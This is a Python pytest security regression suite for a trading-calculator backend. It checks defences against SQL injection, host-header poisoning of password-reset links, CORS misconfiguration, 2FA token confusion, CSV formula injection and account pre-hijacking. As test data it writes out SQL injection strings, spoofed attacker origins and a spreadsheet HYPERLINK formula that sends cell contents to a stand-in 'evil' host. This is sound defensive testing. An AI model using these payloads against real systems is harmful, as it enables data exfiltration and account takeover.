"""
Automated security regression tests — run in CI on every deploy.

These assert the two invariants that, if broken, would be catastrophic:

  1. The Mongo->PostgreSQL shim never lets attacker input reach SQL as code
     (SQL injection): field names are whitelisted, values are parameterised.
  2. The strict field-name regex rejects anything that could break out of a
     quoted identifier.

The shim helpers live inside the big server.py module, which imports the whole
FastAPI app. To keep this test fast and dependency-free (it must run even
without fastapi/stripe/asyncpg installed), we extract just the three pure
helpers (_SAFE_FIELD_RE, _build_where_clause, _serialize) from the source with
`ast` and exercise them in isolation.
"""
import ast
import asyncio
import json
import logging
import os
import re as _re
from pathlib import Path
from typing import Optional

import pytest

_SERVER = Path(__file__).resolve().parent.parent / "server.py"
_MISSING_APIS = Path(__file__).resolve().parent.parent / "missing_apis.py"


def _load_shim_helpers():
    src = _SERVER.read_text(encoding="utf-8")
    tree = ast.parse(src)
    # Todo lo que `_build_where_clause` NECESITE va aquí. `_regex_seguro` entró
    # al cerrar el 500 por expresión regular inválida: sin él, este fichero
    # fallaba con un `NameError` en `<string>` que no dice nada de inyección SQL
    # y cuesta un rato localizar. Ver la comprobación de humo del final.
    wanted_funcs = {"_build_where_clause", "_serialize", "_regex_seguro"}
    chunks = []
    for node in tree.body:
        if isinstance(node, ast.Assign) and any(
            getattr(t, "id", None) == "_SAFE_FIELD_RE" for t in node.targets
        ):
            chunks.append(ast.get_source_segment(src, node))
        if isinstance(node, ast.FunctionDef) and node.name in wanted_funcs:
            chunks.append(ast.get_source_segment(src, node))
    assert len(chunks) >= 3, "could not extract shim helpers from server.py"
    # `log_safe` se importa de `log_seguro`, que es un módulo suelto y SIN
    # dependencias justamente para esto: los ayudantes del shim sanean lo que
    # loguean, y sin él aquí salían diez `NameError` que no tenían nada que ver
    # con la inyección SQL que este fichero prueba. Importarlo de `server.py`
    # arrastraría FastAPI, Stripe y asyncpg, que es lo que este test evita.
    from log_seguro import log_safe

    ns = {
        "_re_module": _re, "re": _re, "logging": logging, "log_safe": log_safe,
        "_json_module": json, "json": json, "_json_default": str,
    }
    exec("\n\n".join(chunks), ns)  # noqa: S102 — trusted first-party source

    # Humo: que lo extraído se pueda EJECUTAR, no sólo compilar.
    #
    # El extractor coge funciones por nombre, así que en cuanto
    # `_build_where_clause` llama a un ayudante nuevo, este espacio de nombres
    # se queda corto y todas las pruebas del fichero revientan con un
    # `NameError: name 'X' is not defined` en `<string>:NN`. Eso no se lee como
    # «falta añadir X a wanted_funcs», que es lo que pasa. Aquí se dice.
    try:
        ns["_build_where_clause"]({"campo": {"$regex": "x", "$options": "i"}}, 1)
        ns["_build_where_clause"]({"$or": [{"a": 1}, {"b": {"$in": [1, "x"]}}]}, 1)
    except NameError as e:  # pragma: no cover - sólo salta si alguien añade una dependencia
        falta = str(e).split("'")[1] if "'" in str(e) else str(e)
        raise AssertionError(
            f"`_build_where_clause` usa `{falta}`, que este test no extrae de "
            f"server.py. Añádelo a `wanted_funcs` (o a `ns` si es un módulo)."
        ) from e
    return ns


_NS = _load_shim_helpers()
_SAFE_FIELD_RE = _NS["_SAFE_FIELD_RE"]
build_where = _NS["_build_where_clause"]

# Strings a query key must NEVER be allowed to contain (they'd break the SQL).
INJECTION_KEYS = [
    "email' OR '1'='1",
    "x'); DROP TABLE users;--",
    "a') UNION SELECT password FROM users--",
    "n')=1--",
    "q'--",
    "id\"; DELETE FROM users;",
    "field OR 1=1",
    "a b",              # space
    "a.b",              # dot (not allowed by the regex)
    "'; --",
]

# SQL that must never appear verbatim in a generated WHERE clause.
DANGEROUS_FRAGMENTS = ["OR '1'='1", "DROP TABLE", "UNION SELECT", "DELETE FROM", "--", "1'='1", "1=1"]


@pytest.mark.parametrize("bad_key", INJECTION_KEYS)
def test_malicious_field_names_are_rejected_by_regex(bad_key):
    assert not _SAFE_FIELD_RE.match(bad_key), f"regex wrongly accepted {bad_key!r}"


@pytest.mark.parametrize("legit_key", ["email", "user_id", "is_admin", "created_at", "_x", "A1_b2"])
def test_legit_field_names_pass_regex(legit_key):
    assert _SAFE_FIELD_RE.match(legit_key)


@pytest.mark.parametrize("bad_key", INJECTION_KEYS)
def test_injection_in_query_key_produces_no_sql(bad_key):
    """A malicious filter key must be dropped, never interpolated into SQL."""
    for value in ("x", {"$ne": None}, {"$regex": ".*"}, {"$in": ["a"]}):
        clause, params, _ = build_where({bad_key: value}, 1)
        assert not any(frag in (clause or "") for frag in DANGEROUS_FRAGMENTS), (
            f"injection leaked into SQL for key={bad_key!r}: {clause!r}"
        )


@pytest.mark.parametrize("payload", [
    "x' OR '1'='1",
    "'; DROP TABLE users;--",
    "\" UNION SELECT * FROM users--",
    "1'; DELETE FROM trades WHERE '1'='1",
])
def test_malicious_values_are_parameterised_not_inlined(payload):
    """Dangerous VALUES must live in params (as data), never in the SQL text."""
    for filt in ({"email": payload},
                 {"name": {"$regex": payload}},
                 {"status": {"$in": [payload]}},
                 {"age": {"$ne": payload}}):
        clause, params, _ = build_where(filt, 1)
        assert payload not in (clause or ""), f"value inlined into SQL: {clause!r}"
        joined = " ".join(str(p) for p in params)
        assert payload in joined, "value should be carried as a bound parameter"


def test_normal_equality_uses_jsonb_containment_param():
    clause, params, _ = build_where({"email": "user@test.com"}, 1)
    assert clause == "data @> $1::jsonb"
    assert json.loads(params[0]) == {"email": "user@test.com"}


def test_password_hashing_is_bcrypt_and_not_reversible():
    """Passwords must be bcrypt-hashed, salted and verifiable — never plaintext."""
    bcrypt = pytest.importorskip("bcrypt")
    pw = "S3cret-Passw0rd!"
    h = bcrypt.hashpw(pw.encode(), bcrypt.gensalt(rounds=12)).decode()
    assert h != pw and h.startswith("$2")           # bcrypt marker, not plaintext
    assert bcrypt.checkpw(pw.encode(), h.encode())  # verifies
    assert not bcrypt.checkpw(b"wrong", h.encode())
    # same password hashes differently each time (unique salt)
    h2 = bcrypt.hashpw(pw.encode(), bcrypt.gensalt(rounds=12)).decode()
    assert h != h2


# ── Host-header injection into emailed links (password reset / verification) ──
#
# Links we email must be built from a TRUSTED base URL, never from the raw
# Host/Origin/Referer of the incoming request. Otherwise an attacker can POST
# /auth/forgot-password for a victim with `Origin: https://evil.com` and the
# victim receives a reset link pointing at the attacker's site (token in URL →
# account takeover). These tests pin `missing_apis._trusted_link_base`.

def _load_trusted_link_base():
    src = _MISSING_APIS.read_text(encoding="utf-8")
    tree = ast.parse(src)
    for node in tree.body:
        if isinstance(node, ast.FunctionDef) and node.name == "_trusted_link_base":
            ns = {"os": os, "Optional": Optional, "Request": object}
            exec(ast.get_source_segment(src, node), ns)  # noqa: S102 — first-party source
            return ns["_trusted_link_base"]
    raise AssertionError("could not extract _trusted_link_base from missing_apis.py")


trusted_link_base = _load_trusted_link_base()


class _FakeHeaders:
    def __init__(self, d):
        self._d = {k.lower(): v for k, v in d.items()}

    def get(self, k, default=None):
        return self._d.get(k.lower(), default)


class _FakeRequest:
    def __init__(self, **headers):
        self.headers = _FakeHeaders(headers)


CANONICAL = "https://tradingcalculator.pro"


@pytest.fixture(autouse=True)
def _clean_link_env(monkeypatch):
    monkeypatch.delenv("CORS_ORIGINS", raising=False)
    monkeypatch.setenv("FRONTEND_URL", CANONICAL)
    monkeypatch.setenv("ENVIRONMENT", "production")


@pytest.mark.parametrize("evil_origin", [
    "https://evil.com",
    "http://attacker.example",
    "https://tradingcalculator.pro.evil.com",   # suffix trick
    "https://eviltradingcalculator.pro",         # prefix trick
    "https://tradingcalculator.pro@evil.com",    # userinfo trick
    "null",
])
def test_emailed_link_base_ignores_untrusted_origin(evil_origin):
    """A poisoned Host/Origin/Referer must never end up in an emailed link."""
    req = _FakeRequest(origin=evil_origin, referer=evil_origin + "/x", host="evil.com")
    base = trusted_link_base(req)
    assert base == CANONICAL, f"leaked untrusted origin: {base!r}"
    assert "evil" not in base and "attacker" not in base


def test_emailed_link_base_falls_back_to_canonical_when_no_headers():
    assert trusted_link_base(_FakeRequest()) == CANONICAL
    assert trusted_link_base(None) == CANONICAL


def test_emailed_link_base_allows_canonical_and_www():
    for good in (CANONICAL, "https://www.tradingcalculator.pro"):
        assert trusted_link_base(_FakeRequest(origin=good)) == good


def test_emailed_link_base_honours_explicit_cors_allowlist(monkeypatch):
    monkeypatch.setenv("CORS_ORIGINS", "https://staging.tradingcalculator.pro")
    ok = "https://staging.tradingcalculator.pro"
    assert trusted_link_base(_FakeRequest(origin=ok)) == ok
    # something NOT on the list still falls back to canonical
    assert trusted_link_base(_FakeRequest(origin="https://evil.com")) == CANONICAL


def test_emailed_link_base_rejects_the_lookalike_third_party_domain():
    """`tradingcalculatorpro.com` (sin punto) es de un tercero: ni CORS ni un
    enlace de reset pueden apuntar ahí. Estuvo en ambas listas por error hasta
    el cutover del 2026-08-28 — ver docs/MIGRACION_DOMINIO.md."""
    for ajeno in ("https://tradingcalculatorpro.com", "https://www.tradingcalculatorpro.com"):
        assert trusted_link_base(_FakeRequest(origin=ajeno)) == CANONICAL


# ============================================================
#  El origen donde SE SIRVE la web tiene que estar permitido
#  sin depender de una variable de entorno del despliegue
# ============================================================
#
# Contexto del fallo que fija esto (2026-08-05): la web se publicaba en
# `https://abcde-rgb.github.io/Tradingcalculatorpro.com` y la lista de CORS del
# código sólo traía `tradingcalculatorpro.com`. Lo único que hacía funcionar el
# login era la variable `CORS_ORIGINS` que ponía el despliegue.
#
# Y volvió a pasar el 2026-08-28, en el otro sentido: el cutover puso el `CNAME`
# a `tradingcalculator.pro` y desplegó la web ahí, pero nadie tocó esta lista.
# Resultado: la web entera dejó de hablar con el backend en producción. Por eso
# el origen servido se fija AQUÍ, y por eso hay un test que lo comprueba.
#
# Por qué es grave y por qué se ve tan mal: sin la cabecera CORS el backend
# responde **200 con las cookies puestas** y es el NAVEGADOR quien descarta la
# respuesta. En los logs de Cloud Run el login se ve perfecto; en la web no se
# puede entrar y no hay ningún error que mirar. `curl` tampoco lo reproduce,
# porque curl ignora CORS.
#
# Y el backend se despliega solo en cada push a `main` (Cloud Run source deploy): un
# `gcloud run deploy` sin `--set-env-vars` borra las variables del servicio y
# tumba el login de todo el sitio. El origen real no puede depender de que
# alguien se acuerde de una variable.

def _cors_origins_with_env(env: dict) -> list:
    """Evalúa el bloque `_CORS_ORIGINS` de server.py con un entorno dado.

    Se extrae con `ast` en vez de importar server.py porque la lista se calcula
    en tiempo de import: una vez importado el módulo, cambiar la variable de
    entorno ya no tiene efecto, y el test no probaría nada.
    """
    src = _SERVER.read_text(encoding="utf-8")
    tree = ast.parse(src)
    chunks, capturing = [], False
    for node in tree.body:
        if isinstance(node, ast.Assign) and any(
            getattr(t, "id", None) == "_CORS_ORIGINS" for t in node.targets
        ):
            capturing = True
        if capturing:
            chunks.append(ast.get_source_segment(src, node))
            # el bloque acaba en el bucle que añade los orígenes extra
            if isinstance(node, ast.For):
                break
    assert chunks, "no se pudo extraer _CORS_ORIGINS de server.py"
    ns = {"os": type("_os", (), {"environ": env})()}
    exec("\n".join(chunks), ns)  # noqa: S102 — código propio
    return ns["_CORS_ORIGINS"]


# El Origin que manda el navegador de un usuario real. Sale del `CNAME` de
# `frontend/public/` — si algún día cambia ahí, tiene que cambiar aquí, y este
# test es lo que obliga a acordarse.
SERVED_ORIGIN = "https://tradingcalculator.pro"


def test_served_origin_matches_the_cname_committed_in_the_frontend():
    """La lista de CORS y el `CNAME` desplegado no pueden divergir.

    El fallo del 2026-08-28 fue exactamente esto: el `CNAME` pasó a
    `tradingcalculator.pro` y la lista se quedó con el dominio viejo.
    """
    cname = (_SERVER.parent.parent / "frontend" / "public" / "CNAME")
    assert cname.exists(), "falta frontend/public/CNAME: el dominio propio no sobrevive al deploy"
    dominio = cname.read_text(encoding="utf-8").strip()
    assert SERVED_ORIGIN == f"https://{dominio}", (
        f"el CNAME sirve {dominio!r} y este test fija {SERVED_ORIGIN!r}"
    )


def test_served_origin_is_allowed_without_any_env_var():
    """El origen donde vive la web entra por código, no por despliegue."""
    origins = _cors_origins_with_env({})
    assert SERVED_ORIGIN in origins, (
        "El frontend se sirve en " + SERVED_ORIGIN + " y no está en la lista de "
        "CORS. Sin la cabecera el navegador descarta la respuesta del login: el "
        "backend devuelve 200 y el usuario no puede entrar."
    )
    assert "https://www.tradingcalculator.pro" in origins, "falta el www del dominio propio"


def test_github_pages_stays_allowed_as_a_fallback():
    """Pages sigue respondiendo y redirige al dominio propio: si el DNS falla,
    que al menos el login no se caiga además por CORS."""
    assert "https://abcde-rgb.github.io" in _cors_origins_with_env({})


def test_the_lookalike_third_party_domain_is_never_allowed():
    """`tradingcalculatorpro.com` (sin punto) lo sirve un tercero.

    Con `allow_credentials=True`, tenerlo en la lista permitiría a esa web leer
    respuestas autenticadas de nuestros usuarios. Estuvo ahí por error.
    """
    origins = _cors_origins_with_env({})
    for ajeno in ("https://tradingcalculatorpro.com", "https://www.tradingcalculatorpro.com"):
        assert ajeno not in origins, (
            f"{ajeno} es un dominio ajeno y está en la lista de CORS con credenciales"
        )


def test_extra_origins_from_env_still_work_and_do_not_duplicate():
    origins = _cors_origins_with_env({"CORS_ORIGINS": "https://staging.example.com," + SERVED_ORIGIN})
    assert "https://staging.example.com" in origins
    assert origins.count(SERVED_ORIGIN) == 1, "un origen repetido no debe duplicarse"


# ── Confusión de tipo de token: el pre-2FA no autoriza (SEC-2026-2FA) ──────────
# get_current_user aceptaba cualquier token bien firmado, sin mirar su `type`.
# El `2fa_pending` se emite tras la contraseña pero ANTES del segundo factor, así
# que tener la contraseña bastaba para operar en los endpoints que dependen de
# esa función — anulando el 2FA. Verificado con PoC (leer/escribir/borrar).

def _decode_and_gate_type(token_type: str) -> bool:
    """Reproduce la comprobación de tipo que get_current_user aplica ahora:
    devuelve True si un token de ese `type` sería aceptado como acceso."""
    import re
    src = _SERVER.read_text(encoding='utf-8')
    # La guarda vive en get_current_user; comprobamos que el filtro existe y que
    # sólo 'access' pasa.
    body = src.split("async def get_current_user", 1)[1].split("async def require_user", 1)[0]
    assert 'payload.get("type") != "access"' in body, (
        "get_current_user ya no filtra por type: un refresh o un 2fa_pending "
        "volverían a autorizar (bypass de 2FA)."
    )
    return token_type == "access"


def test_get_current_user_rejects_non_access_tokens():
    assert _decode_and_gate_type("access") is True
    assert _decode_and_gate_type("refresh") is False
    assert _decode_and_gate_type("2fa_pending") is False
    assert _decode_and_gate_type("magic_link") is False


def test_all_auth_dependencies_check_token_type():
    """Las tres puertas de entdada exigen type == access. Si una deja de hacerlo,
    es un bypass, así que se fija aquí para las tres a la vez."""
    src = _SERVER.read_text(encoding='utf-8')
    for fn in ("get_current_user", "require_user", "require_admin"):
        body = src.split(f"async def {fn}", 1)[1][:1600]
        assert 'payload.get("type") != "access"' in body, (
            f"{fn} no comprueba que el token sea de acceso"
        )


# ── Inyección de fórmulas en el export CSV admin (SEC-2026-CSV) ────────────────
# `name` lo elige el usuario y el CSV lo abre un ADMIN. Una celda que empieza por
# = + - @ la evalúa la hoja de cálculo (=HYPERLINK exfiltra; DDE ejecuta).

def _csv_safe_ref(value):
    """Copia de la lógica de `_csv_safe` en server.py, para fijarla sin importar
    el módulo entero (que levanta la app). El test de abajo comprueba además que
    la función real existe con esta forma."""
    if isinstance(value, str) and value and value[0] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + value
    return value


import pytest as _pytest


@_pytest.mark.parametrize("payload", [
    '=HYPERLINK("http://evil/?d="&A2,"click")',
    '+1+1',
    '-2+3',
    '@SUM(A1:A9)',
    '\t=cmd',
    '\r=cmd',
])
def test_csv_formula_payloads_are_neutralised(payload):
    out = _csv_safe_ref(payload)
    assert out.startswith("'"), f"la fórmula {payload!r} no se neutralizó"


@_pytest.mark.parametrize("benign", ["Juan Pérez", "trader_2026", "AAPL 220C", "", "3.14"])
def test_csv_benign_values_are_untouched(benign):
    assert _csv_safe_ref(benign) == benign


def test_server_has_the_csv_guard_wired_into_the_export():
    """La función real existe y el endpoint la aplica a cada celda."""
    src = _SERVER.read_text(encoding="utf-8")
    assert "def _csv_safe(" in src, "falta el helper _csv_safe en server.py"
    # Se aplica sobre las filas del export, no sólo definido y sin usar.
    assert "_csv_safe(v)" in src, "el export de usuarios no aplica _csv_safe"


# ── Account pre-hijacking en el enlazado federado (SEC-2026-PREHIJACK) ─────────
# El registro no exige demostrar posesión del email y el login funciona sin
# verificarlo. Un atacante registraba el correo de la víctima, se guardaba la
# contraseña y esperaba: al entrar la víctima con Google, `google_auth` enlazaba
# por email y la contraseña del atacante seguía sirviendo. Verificado con PoC.

def _prehijack_decision(has_password: bool, email_verified: bool) -> bool:
    """Réplica de la condición del enlazado: ¿hay que retirar la contraseña?"""
    return bool(has_password) and not email_verified


def test_password_is_dropped_when_linking_over_an_unverified_email():
    """El caso del ataque: contraseña puesta sobre un email nunca verificado."""
    assert _prehijack_decision(has_password=True, email_verified=False) is True


def test_legitimate_linking_keeps_the_password():
    """Mismo usuario que verificó su correo y ahora además usa Google: su
    contraseña NO se toca, o el arreglo se convertiría en una denegación de
    servicio para gente legítima."""
    assert _prehijack_decision(has_password=True, email_verified=True) is False


def test_google_only_account_is_untouched():
    assert _prehijack_decision(has_password=False, email_verified=True) is False
    assert _prehijack_decision(has_password=False, email_verified=False) is False


def test_google_handler_wires_the_guard_and_revokes_sessions():
    """La guarda existe en el handler real y revoca sesiones: sin la revocación,
    un token ya emitido al atacante seguiría vivo hasta una hora."""
    src = _SERVER.read_text(encoding="utf-8")
    handler = src.split("async def google_auth", 1)[1].split("\n@api_router", 1)[0]
    assert 'not user.get("email_verified")' in handler, "falta la guarda de pre-hijacking"
    assert '"password"] = None' in handler or '"password": None' in handler, (
        "el enlazado no retira la contraseña no verificada"
    )
    assert "_revoke_all_tokens_for_user" in handler, (
        "el enlazado no revoca las sesiones vivas del atacante"
    )


# ============================================================
#  El correo no distingue mayúsculas (BUG-070)
# ============================================================
#
# El registro guardaba el correo TAL COMO SE TECLEABA y el login lo buscaba con
# igualdad exacta, que en PostgreSQL distingue mayúsculas. Resultado: quien se
# registró como `Ana@x.com` y entraba como `ana@x.com` recibía «Credenciales
# inválidas» con la contraseña correcta — y el 401 es idéntico al de una
# contraseña mala, así que no había ninguna pista. Peor: al entrar con Google
# (que devuelve el correo en minúsculas) se le creaba una cuenta NUEVA y vacía.

_SERVER_SRC = _SERVER.read_text(encoding="utf-8")


def test_ieq_compares_the_whole_string_lowercased():
    """`$ieq` baja AMBOS lados y compara por igualdad, no por patrón."""
    clause, params, _ = build_where({"email": {"$ieq": "Ana@X.com"}}, 1)
    assert "LOWER" in clause and "=" in clause, clause
    assert "~" not in clause, "un operador de regex aquí sería substring, no igualdad"
    assert params == ["Ana@X.com"], "el valor va como parámetro, no incrustado"


def test_ieq_is_not_an_unanchored_regex():
    """La trampa que este operador existe para evitar.

    Con `$regex` + `i` el shim emite `~*`, que va SIN anclar: el patrón
    `ana@x.com` casaría con `otro+ana@x.com.evil.com`, y un correo es un regex
    válido (el `.` comodín, el `+` cuantificador). Sería un agujero de
    suplantación, no un arreglo.
    """
    import re
    victima = "ana@x.com"
    atacante = "otro+ana@x.com.evil.com"
    # Así se comportaría la alternativa descartada:
    assert re.search(victima, atacante, re.I), "premisa del test: el regex sí casa"
    # Y así se comporta la elegida:
    assert victima.lower() != atacante.lower(), "`$ieq` compara la cadena entera"

    clause, _, _ = build_where({"email": {"$ieq": victima}}, 1)
    assert "~*" not in clause, "`$ieq` no puede degradar a regex sin anclar"


@pytest.mark.parametrize("payload", [
    "'; DROP TABLE users; --",
    "x' OR '1'='1",
])
def test_ieq_parameterises_malicious_values(payload):
    clause, params, _ = build_where({"email": {"$ieq": payload}}, 1)
    assert payload not in (clause or ""), f"valor incrustado en el SQL: {clause!r}"
    assert payload in " ".join(str(p) for p in params)


def test_login_looks_the_user_up_case_insensitively():
    """El fallo estaba AQUÍ, no en el shim: la consulta del login.

    Vale tanto el `$ieq` a pelo como el buscador determinista que lo envuelve
    —lo que NO puede volver es una igualdad exacta sobre `credentials.email`.
    """
    i = _SERVER_SRC.find("async def login(")
    assert i != -1, "no se encontró el endpoint de login"
    cuerpo = _SERVER_SRC[i:i + 1200]
    assert ('"$ieq"' in cuerpo) or ("_buscar_usuario_por_correo" in cuerpo), (
        "el login vuelve a buscar el correo con igualdad exacta: quien se "
        "registró con otra caja no puede entrar y el 401 no lo explica"
    )
    assert 'find_one({"email": credentials.email}' not in cuerpo


def test_register_stores_the_email_normalised():
    """Normalizar al ESCRIBIR: sin esto conviven dos cuentas por el mismo correo."""
    i = _SERVER_SRC.find("async def register(")
    assert i != -1, "no se encontró el endpoint de registro"
    cuerpo = _SERVER_SRC[i:i + 1600]
    assert ".strip().lower()" in cuerpo, "el registro no normaliza el correo"
    assert '"email": email_norm' in cuerpo, "el registro guarda el correo sin normalizar"


def test_there_is_a_functional_index_for_the_case_insensitive_lookup():
    """Sin índice sobre LOWER(...), cada login recorre `users` entera.

    PostgreSQL sólo usa un índice funcional si su expresión coincide con la de
    la consulta, y el que ya existía es sobre `(data->>'email')` a secas.
    """
    assert "idx_users_email_lower" in _SERVER_SRC
    assert "LOWER((data->>'email'))" in _SERVER_SRC


# ============================================================
#  Con duplicados, la cuenta elegida tiene que ser SIEMPRE la misma
# ============================================================
#
# BUG-070 dejó duplicados en producción: la comprobación de duplicados del
# registro también distinguía mayúsculas, así que el mismo correo se pudo dar de
# alta dos veces —una cuenta con los datos y el admin, otra vacía—. Y `find_one`
# es `SELECT … LIMIT 1` SIN `ORDER BY`: con dos filas que casan, PostgreSQL
# devuelve una cualquiera y puede cambiar entre consultas. Entrar unas veces en
# una cuenta y otras en la otra es peor que fallar, y en `admin/promote` o en el
# alta manual de un cobro significa tocar la fila equivocada.

def _cargar_buscador():
    """Extrae `_buscar_usuario_por_correo` de server.py y lo ejecuta con un `db`
    de mentira: así se prueba la REGLA sin levantar la aplicación ni la base."""
    tree = ast.parse(_SERVER_SRC)
    for node in tree.body:
        if isinstance(node, ast.AsyncFunctionDef) and node.name == "_buscar_usuario_por_correo":
            return ast.get_source_segment(_SERVER_SRC, node)
    raise AssertionError("no se encontró _buscar_usuario_por_correo en server.py")


class _CursorFalso:
    def __init__(self, filas): self._filas = filas
    def sort(self, campo, direccion=1):
        self._filas = sorted(self._filas, key=lambda d: d.get(campo) or "",
                             reverse=(direccion == -1))
        return self
    async def to_list(self, n=None): return list(self._filas)


class _ColeccionFalsa:
    def __init__(self, filas): self._filas = filas
    def find(self, filtro, projection=None):
        pedido = filtro["email"]["$ieq"].strip().lower()
        return _CursorFalso([f for f in self._filas
                             if (f.get("email") or "").lower() == pedido])


class _DbFalsa:
    def __init__(self, filas): self.users = _ColeccionFalsa(filas)


def _buscar(filas, correo):
    ns = {"db": _DbFalsa(filas), "Optional": Optional}
    exec(_cargar_buscador(), ns)  # noqa: S102 — código propio
    return asyncio.run(ns["_buscar_usuario_por_correo"](correo))


# El par que de verdad existe en producción: la cuenta vieja con el admin, y la
# que creó el teclado del móvil al capitalizar la primera letra.
_PAR = [
    {"email": "ana@x.com",  "id": "vieja", "created_at": "2026-01-01T00:00:00"},
    {"email": "Ana@x.com",  "id": "nueva", "created_at": "2026-08-28T00:00:00"},
]


def test_exact_match_wins_over_a_case_variant():
    """Una coincidencia exacta es inequívoca: esa cuenta se registró así."""
    assert _buscar(_PAR, "ana@x.com")["id"] == "vieja"
    assert _buscar(_PAR, "Ana@x.com")["id"] == "nueva"


def test_without_an_exact_match_the_oldest_wins():
    """Al adivinar, la original — la que tiene los datos y el admin."""
    assert _buscar(_PAR, "ANA@X.COM")["id"] == "vieja"


def test_the_choice_does_not_depend_on_the_row_order():
    """El fallo que esto evita: `LIMIT 1` sin `ORDER BY` devuelve una cualquiera.

    Se consulta con las filas en los dos órdenes posibles y se exige el mismo
    resultado. Sin el criterio, cada orden devolvería una cuenta distinta.
    """
    a = _buscar(_PAR, "ANA@X.COM")
    b = _buscar(list(reversed(_PAR)), "ANA@X.COM")
    assert a["id"] == b["id"] == "vieja", "la cuenta elegida cambia con el orden de las filas"


def test_a_single_account_is_found_whatever_the_case():
    una = [{"email": "ana@x.com", "id": "u1", "created_at": "2026-01-01T00:00:00"}]
    for tecleado in ("ana@x.com", "Ana@x.com", "ANA@X.COM", "  Ana@X.com  "):
        assert _buscar(una, tecleado)["id"] == "u1", f"no la encuentra con {tecleado!r}"


def test_an_unknown_or_empty_email_finds_nobody():
    assert _buscar(_PAR, "otro@x.com") is None
    assert _buscar(_PAR, "") is None
    assert _buscar(_PAR, None) is None


def test_the_identity_routes_use_the_deterministic_lookup():
    """Login, Google, promote y el alta manual de cobros, por el mismo camino."""
    for ruta in ("async def login(", "async def google_auth(",
                 "async def admin_promote_user(", "async def admin_payment_manual("):
        i = _SERVER_SRC.find(ruta)
        assert i != -1, f"no se encontró {ruta}"
        assert "_buscar_usuario_por_correo" in _SERVER_SRC[i:i + 2600], (
            f"{ruta.strip()} vuelve a resolver el correo sin criterio de desempate: "
            "con un duplicado, la cuenta elegida cambia entre consultas"
        )


# ============================================================
#  Toda respuesta de auth describe al usuario IGUAL (BUG-072)
# ============================================================
#
# `ProtectedRoute` decide con `user?.two_factor_enabled === false`. Cuatro
# respuestas —login, refresh, magic link y Google— no mandaban ese campo, así
# que valía `undefined`, y `undefined === false` es FALSO: la guarda no saltaba y
# el admin entraba al panel, donde el backend le devolvía 428 en cada llamada
# porque el 2FA es obligatorio para administradores.
#
# El síntoma era desconcertante: en incógnito «funcionaba» (recién logueado el
# campo no existe → te deja pasar) y en el navegador de siempre no (el `user`
# guardado venía de `/auth/me`, que SÍ lo manda, así que valía `false` → a
# Ajustes). El mismo usuario, la misma cuenta, dos comportamientos.
#
# La regla no mira los cuatro sitios: mira que NINGUNA respuesta que describa a
# un usuario se deje el campo. Comprobar sólo los conocidos dejaría pasar el
# siguiente endpoint que se escriba.

def _objetos_user_de_respuesta():
    """Los objetos que el frontend guarda como `user`, y sólo esos.

    Se identifican por su POSICIÓN, no por sus claves: son el valor de la clave
    `"user"` de una respuesta, que es literalmente lo que hace el store
    (`set({ user: data.user })`), más el `return` de `/auth/me`, que lo devuelve
    plano. Un heurístico por claves cazaba también las FILAS de base de datos y
    las tablas del panel de admin, que no tienen por qué llevar este campo.
    """
    tree = ast.parse(_SERVER_SRC)
    objetos = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Dict):
            for k, v in zip(node.keys, node.values):
                if (isinstance(k, ast.Constant) and k.value == "user"
                        and isinstance(v, ast.Dict)):
                    claves = {kk.value for kk in v.keys
                              if isinstance(kk, ast.Constant) and isinstance(kk.value, str)}
                    objetos.append((v.lineno, claves))
    # `/auth/me` devuelve el usuario plano, sin envolverlo en `"user"`.
    for node in ast.walk(tree):
        if isinstance(node, ast.AsyncFunctionDef) and node.name == "get_me":
            for sub in ast.walk(node):
                if isinstance(sub, ast.Return) and isinstance(sub.value, ast.Dict):
                    claves = {kk.value for kk in sub.value.keys
                              if isinstance(kk, ast.Constant) and isinstance(kk.value, str)}
                    objetos.append((sub.value.lineno, claves))
    return objetos


def test_every_auth_response_describes_the_user_the_same_way():
    """Si un objeto de usuario lleva `is_admin`, tiene que llevar el 2FA.

    Son las dos claves con las que la guarda de rutas decide, y que una viaje
    sin la otra hace que la app se comporte distinto según por dónde entres.
    """
    objetos = _objetos_user_de_respuesta()
    assert len(objetos) >= 7, (
        f"sólo se han encontrado {len(objetos)} objetos `user` de respuesta; la "
        "regla ha dejado de reconocerlos y no está comprobando nada"
    )
    incompletos = [(ln, sorted({"is_admin", "two_factor_enabled"} - claves))
                   for ln, claves in objetos
                   if "is_admin" in claves and "two_factor_enabled" not in claves]
    assert not incompletos, (
        f"estas respuestas mandan `is_admin` sin `two_factor_enabled`: {incompletos}. "
        "En el frontend el campo valdrá `undefined`, y `undefined === false` es "
        "falso: la guarda del panel no salta y el admin entra a una pantalla "
        "donde cada llamada devolverá 428."
    )
